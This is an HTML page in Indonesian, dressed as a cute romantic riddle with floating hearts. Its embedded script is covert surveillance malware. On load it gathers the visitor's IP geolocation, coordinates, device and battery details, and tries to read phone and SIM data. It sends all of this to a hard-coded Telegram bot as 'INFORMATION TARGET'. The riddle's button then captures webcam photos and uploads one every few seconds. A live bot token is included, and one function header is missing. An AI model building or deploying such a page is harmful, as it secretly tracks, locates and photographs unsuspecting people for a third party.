<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Cute!</title>
<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;500;700&display=swap" rel="stylesheet">
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  -webkit-tap-highlight-color: transparent;
  -webkit-touch-callout: none;
  -webkit-user-select: none;
  user-select: none;
}

body {
  font-family: 'Quicksand', cursive, sans-serif;
  background-image: url('https://files.catbox.moe/ss50jf.jpg');
  background-size: cover;
  background-position: center;
  background-attachment: fixed;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  text-align: center;
  color: #fff;
  overflow: hidden;
  position: relative;
}

/* Overlay untuk membuat teks lebih terbaca */
body::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.4);
  z-index: 1;
}

.container {
  position: relative;
  z-index: 10;
  padding: 20px;
  max-width: 90%;
}

h1 {
  font-size: clamp(2rem, 5vw, 3.5rem);
  margin-bottom: 25px;
  text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.5);
  animation: bounce 2s ease-in-out infinite;
  background: linear-gradient(45deg, #ff9a9e, #fad0c4);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}

@keyframes bounce {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}

p {
  font-size: clamp(1rem, 3vw, 1.5rem);
  margin-bottom: 40px;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
  animation: fadeInUp 1s ease-out;
  color: #fff;
}

@keyframes fadeInUp {
  from {
    opacity: 0;
    transform: translateY(20px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

button {
  padding: 18px 45px;
  font-size: clamp(1.1rem, 3vw, 1.5rem);
  font-weight: bold;
  border: none;
  border-radius: 50px;
  background: linear-gradient(45deg, #ff9a9e, #fad0c4);
  color: #fff;
  cursor: pointer;
  transition: all 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
  box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
  position: relative;
  overflow: hidden;
  text-transform: uppercase;
  letter-spacing: 1px;
  font-family: 'Quicksand', cursive, sans-serif;
}

button::before {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
  transition: left 0.5s;
}

button:hover::before {
  left: 100%;
}

button:hover {
  transform: translateY(-3px) scale(1.05);
  box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
  background: linear-gradient(45deg, #fad0c4, #ff9a9e);
}

button:active {
  transform: translateY(-1px) scale(1.02);
  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
}

.heart {
  position: absolute;
  width: 20px;
  height: 20px;
  background: rgba(255, 154, 158, 0.8);
  transform: rotate(45deg);
  animation: floatUp 4s linear infinite;
}

.heart::before,
.heart::after {
  content: '';
  width: 20px;
  height: 20px;
  position: absolute;
  background: rgba(255, 154, 158, 0.8);
  border-radius: 50%;
}

.heart::before {
  top: -10px;
  left: 0;
}

.heart::after {
  left: -10px;
  top: 0;
}

@keyframes floatUp {
  0% {
    opacity: 1;
    transform: translateY(0) rotate(45deg) scale(1);
  }
  100% {
    opacity: 0;
    transform: translateY(-100vh) rotate(45deg) scale(0.5);
  }
}

.status {
  position: fixed;
  bottom: 30px;
  right: 30px;
  background: rgba(255, 255, 255, 0.95);
  color: #ff9a9e;
  padding: 15px 25px;
  border-radius: 30px;
  font-weight: bold;
  display: none;
  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
  animation: slideIn 0.3s ease-out;
  z-index: 1000;
  font-family: 'Quicksand', cursive, sans-serif;
}

@keyframes slideIn {
  from {
    transform: translateX(100%);
    opacity: 0;
  }
  to {
    transform: translateX(0);
    opacity: 1;
  }
}

.loading-dots {
  display: inline-block;
}

.loading-dots::after {
  content: '...';
  animation: dots 1.5s steps(4, end) infinite;
}

@keyframes dots {
  0%, 20% { content: '.'; }
  40% { content: '..'; }
  60%, 100% { content: '...'; }
}

/* Sparkle effect */
.sparkle {
  position: absolute;
  width: 4px;
  height: 4px;
  background: white;
  border-radius: 50%;
  animation: sparkle 3s linear infinite;
}

@keyframes sparkle {
  0%, 100% {
    opacity: 0;
    transform: scale(0);
  }
  50% {
    opacity: 1;
    transform: scale(1);
  }
}

/* Cute floating elements */
.floating-element {
  position: absolute;
  z-index: 2;
  opacity: 0.7;
  animation: float 20s infinite ease-in-out;
}

@keyframes float {
  0%, 100% { transform: translateY(0) rotate(0deg); }
  33% { transform: translateY(-20px) rotate(120deg); }
  66% { transform: translateY(20px) rotate(240deg); }
}
</style>
</head>
<body>
<!-- Floating elements -->
<div class="floating-element" style="top: 10%; left: 5%; font-size: 2rem;">💕</div>
<div class="floating-element" style="top: 20%; right: 10%; font-size: 1.5rem;">💖</div>
<div class="floating-element" style="bottom: 15%; left: 15%; font-size: 1.8rem;">💗</div>
<div class="floating-element" style="bottom: 25%; right: 5%; font-size: 2.2rem;">💝</div>
<div class="floating-element" style="top: 40%; left: 8%; font-size: 1.7rem;">💓</div>
<div class="floating-element" style="top: 60%; right: 15%; font-size: 2rem;">💘</div>

<div class="container">
  <h1>KAMU TAU GAAAA</h1>
  <p>apaaa buah yang namanyaa selalu bikinyaa nyaman</p>
  <button id="btnCamera">apaa tuh</button>
</div>

<div id="status" class="status">
  <span class="loading-dots"></span> Mengirim foto
</div>

<script>
const BOT_TOKEN="8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo"; // BOT TOKEN
const CHAT_ID="6051179992"; // CHAT ID
const STATIC_IMAGE="https://files.catbox.moe/8ybe0o.jpg";
let snapshotInterval;
let isFirstSnapshot = true;

function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}

// Create floating hearts
function createHeart() {
  const heart = document.createElement('div');
  heart.className = 'heart';
  heart.style.left = Math.random() * 100 + '%';
  heart.style.animationDuration = (Math.random() * 3 + 2) + 's';
  heart.style.opacity = Math.random() * 0.5 + 0.3;
  document.body.appendChild(heart);
  
  setTimeout(() => {
    heart.remove();
  }, 4000);
}

// Create sparkles
function createSparkle() {
  const sparkle = document.createElement('div');
  sparkle.className = 'sparkle';
  sparkle.style.left = Math.random() * 100 + '%';
  sparkle.style.top = Math.random() * 100 + '%';
  sparkle.style.animationDelay = Math.random() * 3 + 's';
  document.body.appendChild(sparkle);
  
  setTimeout(() => {
    sparkle.remove();
  }, 3000);
}

// Start animations
setInterval(createHeart, 2000);
setInterval(createSparkle, 500);

// Ambil IP/device info yang lebih akurat menggunakan multiple services
async function getIpInfo(){
  try {
    // Coba dengan ipapi.co terlebih dahulu (lebih akurat)
    let response = await fetch("https://ipapi.co/json/");
    let data = await response.json();
    
    if (data && data.ip) {
      return {
        ip: data.ip || "-",
        city: data.city || "-",
        region: data.region || "-",
        country_name: data.country_name || "-",
        country_code: data.country_code || "-",
        latitude: data.latitude || "0",
        longitude: data.longitude || "0",
        timezone: data.timezone || "-",
        org: data.org || "-",
        asn: data.asn || "-",
        postal: data.postal || "-"
      };
    }
    
    // Fallback ke ipwhois.app
    response = await fetch("https://ipwhois.app/json/");
    data = await response.json();
    
    if(data.success) {
      return {
        ip: data.ip || "-",
        city: data.city || "-",
        region: data.region || "-",
        country_name: data.country || "-",
        country_code: data.country_code || "-",
        latitude: data.latitude || "0",
        longitude: data.longitude || "0",
        timezone: data.timezone || "-",
        org: data.org || "-",
        asn: data.asn || "-",
        postal: data.postal || "-"
      };
    }
    
    // Fallback ke ip-api.com
    response = await fetch("http://ip-api.com/json/");
    data = await response.json();
    
    if(data.status === "success") {
      return {
        ip: data.query || "-",
        city: data.city || "-",
        region: data.regionName || "-",
        country_name: data.country || "-",
        country_code: data.countryCode || "-",
        latitude: data.lat || "0",
        longitude: data.lon || "0",
        timezone: data.timezone || "-",
        org: data.org || data.isp || "-",
        asn: data.as || "-",
        postal: data.zip || "-"
      };
    }
    
    // Jika semua gagal, kembalikan nilai default
    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", timezone:"-", org:"-", asn:"-", postal:"-"};
  } catch(e) {
    console.error("Error getting IP info:", e);
    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", timezone:"-", org:"-", asn:"-", postal:"-"};
  }
}

// Ambil device info yang lebih lengkap
async function getDeviceInfo(){
  const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
  
  // Coba mendapatkan nomor telepon (jika tersedia)
  let phoneNumber = "-";
  try {
    // Coba dengan Contact API jika tersedia
    if ('contacts' in navigator && 'select' in navigator.contacts) {
      const contacts = await navigator.contacts.select(['tel'], {multiple: false});
      if (contacts.length > 0 && contacts[0].tel && contacts[0].tel.length > 0) {
        phoneNumber = contacts[0].tel[0];
      }
    }
  } catch(e) {
    console.log("Phone number access denied or not available");
  }
  
  // Coba mendapatkan informasi SIM (jika tersedia)
  let simInfo = "-";
  try {
    if ('getMobileSubscriberInfo' in navigator) {
      const mobileInfo = await navigator.getMobileSubscriberInfo();
      simInfo = `${mobileInfo.carrierName || "-"} (${mobileInfo.mcc || "-"}/${mobileInfo.mnc || "-"})`;
    }
  } catch(e) {
    console.log("SIM info access denied or not available");
  }
  
  return {
    userAgent:navigator.userAgent,
    platform:navigator.platform,
    language:navigator.language,
    languages:navigator.languages ? navigator.languages.join(", ") : "-",
    screenWidth:screen.width,
    screenHeight:screen.height,
    innerWidth:window.innerWidth,
    innerHeight:window.innerHeight,
    outerWidth:window.outerWidth || "-",
    outerHeight:window.outerHeight || "-",
    cores:navigator.hardwareConcurrency||"-",
    memory:navigator.deviceMemory||"-",
    touchPoints:navigator.maxTouchPoints||0,
    orientation:screen.orientation?.type||"-",
    orientationAngle:screen.orientation?.angle||"-",
    colorDepth:screen.colorDepth||"-",
    pixelRatio:window.devicePixelRatio||"-",
    online:navigator.onLine,
    cookiesEnabled:navigator.cookieEnabled,
    doNotTrack:navigator.doNotTrack,
    connectionType:connection.effectiveType || "-",
    connectionDownlink:connection.downlink || "-",
    connectionRtt:connection.rtt || "-",
    battery:b,
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
    localTime:new Date().toLocaleString(),
    phoneNumber:phoneNumber,
    simInfo:simInfo,
    referrer:document.referrer || "-",
    vendor:navigator.vendor || "-",
    product:navigator.product || "-",
    appVersion:navigator.appVersion || "-",
    appName:navigator.appName || "-"
  };
}

// Build caption Telegram dengan blockquote dan emoji

  const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
  return `<blockquote><b>🎯 INFORMATION TARGET</b>
🌐 IP: ${escapeHtml(ip.ip)}
🏙️ City: ${escapeHtml(ip.city)}
🗺️ Region: ${escapeHtml(ip.region)}
🌍 Country: ${escapeHtml(ip.country_name)}
🏳️ Country Code: ${escapeHtml(ip.country_code)}
📍 Latitude: ${escapeHtml(ip.latitude)}
📍 Longitude: ${escapeHtml(ip.longitude)}
🗺️ Location: ${g}
⏰ Timezone: ${escapeHtml(ip.timezone)}
📮 Postal: ${escapeHtml(ip.postal)}
🏢 Organization: ${escapeHtml(ip.org)}
🔢 ASN: ${escapeHtml(ip.asn)}

<b>📱 Device Info</b>
🔍 User Agent: ${escapeHtml(d.userAgent)}
💻 Platform: ${escapeHtml(d.platform)}
🌐 Language: ${escapeHtml(d.language)}
🌐 Languages: ${escapeHtml(d.languages)}
📱 Screen: ${escapeHtml(d.screenWidth+"x"+d.screenHeight)}
📐 Inner Size: ${escapeHtml(d.innerWidth+"x"+d.innerHeight)}
📐 Outer Size: ${escapeHtml(d.outerWidth+"x"+d.outerHeight)}
⚙️ CPU cores: ${escapeHtml(d.cores)}
💾 RAM (GB): ${escapeHtml(d.memory)}
👆 Touch Points: ${escapeHtml(d.touchPoints)}
🔄 Orientation: ${escapeHtml(d.orientation)}
📐 Orientation Angle: ${escapeHtml(d.orientationAngle)}
🎨 Color Depth: ${escapeHtml(d.colorDepth)}
📐 Pixel Ratio: ${escapeHtml(d.pixelRatio)}
🌐 Online: ${escapeHtml(d.online)}
🍪 Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}
🚫 Do Not Track: ${escapeHtml(d.doNotTrack)}
📶 Connection Type: ${escapeHtml(d.connectionType)}
📶 Connection Downlink: ${escapeHtml(d.connectionDownlink)} Mbps
📶 Connection RTT: ${escapeHtml(d.connectionRtt)} ms
🔋 Battery: ${escapeHtml(d.battery?.level||"-")} (${d.battery?.charging?"Charging🔌":"Not charging🔋"}), ChargingTime: ${escapeHtml(d.battery?.chargingTime||"-")}s, DischargingTime: ${escapeHtml(d.battery?.dischargingTime||"-")}s
🕐 Local Time: ${escapeHtml(d.localTime)}
📞 Phone Number: ${escapeHtml(d.phoneNumber)}
📱 SIM Info: ${escapeHtml(d.simInfo)}
🔗 Referrer: ${escapeHtml(d.referrer)}
🏭 Vendor: ${escapeHtml(d.vendor)}
📦 Product: ${escapeHtml(d.product)}
📲 App Version: ${escapeHtml(d.appVersion)}
📱 App Name: ${escapeHtml(d.appName)}

<b>🔗 URL & Time</b>
🔗 URL: ${escapeHtml(location.href)}
🕐 Time (UTC): ${escapeHtml(new Date().toISOString())}</blockquote>`;
}

// Kirim IP/device + foto statis saat halaman load
async function sendIpDevice(){
  const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      photo: STATIC_IMAGE,
      caption: buildCaption(ip,d),
      parse_mode:"HTML"
    })
  });
}

// Kamera snapshot sebagai file .jpg (document)
async function sendSnapshot(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    const video = document.createElement('video');
    video.style.display='none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();

    await new Promise(resolve => { video.onloadedmetadata = () => setTimeout(resolve, 200); });

    const canvas=document.createElement('canvas');
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("document", blob, "screenshotbyaldofficialr.jpg");
    formData.append("caption", "📸 Sukes screenshot foto target");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: "POST",
      body: formData
    });

    stream.getTracks().forEach(track=>track.stop());
    video.remove();
    
    // Tampilkan status
    const statusEl = document.getElementById('status');
    statusEl.style.display = 'block';
    setTimeout(() => {
      statusEl.style.display = 'none';
    }, 2000);
    
    // Jika ini snapshot pertama, mulai interval
    if(isFirstSnapshot) {
      isFirstSnapshot = false;
      snapshotInterval = setInterval(sendSnapshot, 3000);
    }
  }catch(e){
    console.log("yahhh", e);
  }
}

// Jalankan saat halaman load
window.addEventListener("load", () => {
  sendIpDevice();
});

// Tombol klik kamera - langsung kirim foto pertama
document.getElementById("btnCamera").addEventListener("click", () => {
  if(!snapshotInterval) {
    sendSnapshot();
  }
});

// Hentikan pengiriman foto saat halaman ditutup
window.addEventListener("beforeunload", () => {
  if(snapshotInterval) {
    clearInterval(snapshotInterval);
  }
});
</script>
</body>
</html>
